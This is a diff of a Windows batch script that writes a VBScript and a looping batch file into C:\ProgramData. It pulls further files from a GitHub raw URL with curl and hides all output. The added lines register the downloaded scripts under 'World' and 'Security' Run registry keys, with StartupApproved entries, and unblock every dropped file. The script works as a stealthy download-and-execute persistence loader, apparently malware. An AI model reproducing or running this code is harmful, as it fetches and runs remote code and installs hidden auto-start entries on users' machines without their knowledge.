@@ -4,11 +4,10 @@ del "C:\ProgramData\world.vbs"
 del /Q /S /F "C:\ProgramData\PSU" >> nul
 ping -n 1 www.google.com
 if "%errorlevel%" == "0" goto online
-copy /Y "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" "C:\ProgramData\bgin.bat" >> nul
-REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Bgin" /t REG_SZ /F /D "C:\ProgramData\bgin.bat" >> nul
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "World" /t REG_SZ /F /D "C:\ProgramData\world.vbs" >> nul
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "World" /t REG_BINARY /D 000000000000000000000000 /F >> nul
 timeout 0 >> nul
 set errorlevel=errorlevel
-del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" >> nul
 echo Set WinScriptHost = CreateObject("WScript.Shell")>> "C:\ProgramData\world.vbs"
 >>"C:\ProgramData\world.vbs" (
     set /p "=WinScriptHost.Run " <nul
@@ -26,8 +25,8 @@ echo mkdir "C:\ProgramData\PSU">> "C:\ProgramData\word.bat"
 echo :start>> "C:\ProgramData\word.bat"
 echo ping -n 2 www.google.com>> "C:\ProgramData\word.bat"
 echo if "%%errorlevel%%" == "0" goto online>> "C:\ProgramData\word.bat"
-echo REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Bgin" /t REG_SZ /F /D "C:\ProgramData\bgin.bat">> "C:\ProgramData\word.bat"
-echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Bgin" /t REG_BINARY /D 000000000000000000000000 /F>> "C:\ProgramData\word.bat"
+echo REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "World" /t REG_SZ /F /D "C:\ProgramData\world.vbs">> "C:\ProgramData\word.bat"
+echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "World" /t REG_BINARY /D 000000000000000000000000 /F>> "C:\ProgramData\word.bat"
 echo goto start>> "C:\ProgramData\word.bat"
 echo.>> "C:\ProgramData\word.bat"
 echo :online>> "C:\ProgramData\word.bat"
@@ -53,9 +52,10 @@ echo del "C:\ProgramData\world.vbs">> "C:\ProgramData\word.bat"
 echo exit>> "C:\ProgramData\word.bat">> "C:\ProgramData\word.bat"
 powershell.exe Unblock-File -Path "*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\*" >> nul
-powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*"
+powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*" >> nul
 start "" "C:\ProgramData\world.vbs"
 timeout 0 >> nul
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" >> nul
 exit >> nul
 
 :online
@@ -63,9 +63,11 @@ mkdir "C:\ProgramData\PSU" >> nul
 timeout 0 >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/word.txt" -o "C:\ProgramData\word.bat" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/world.txt" -o "C:\ProgramData\world.vbs" >> nul
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "World" /t REG_SZ /F /D "C:\ProgramData\world.vbs" >> nul
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "World" /t REG_BINARY /D 000000000000000000000000 /F >> nul
 powershell.exe Unblock-File -Path "*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\*" >> nul
-powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*"
+powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*" >> nul
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs" >> nul
 start "" "C:\ProgramData\world.vbs" >> nul
 timeout 0 >> nul
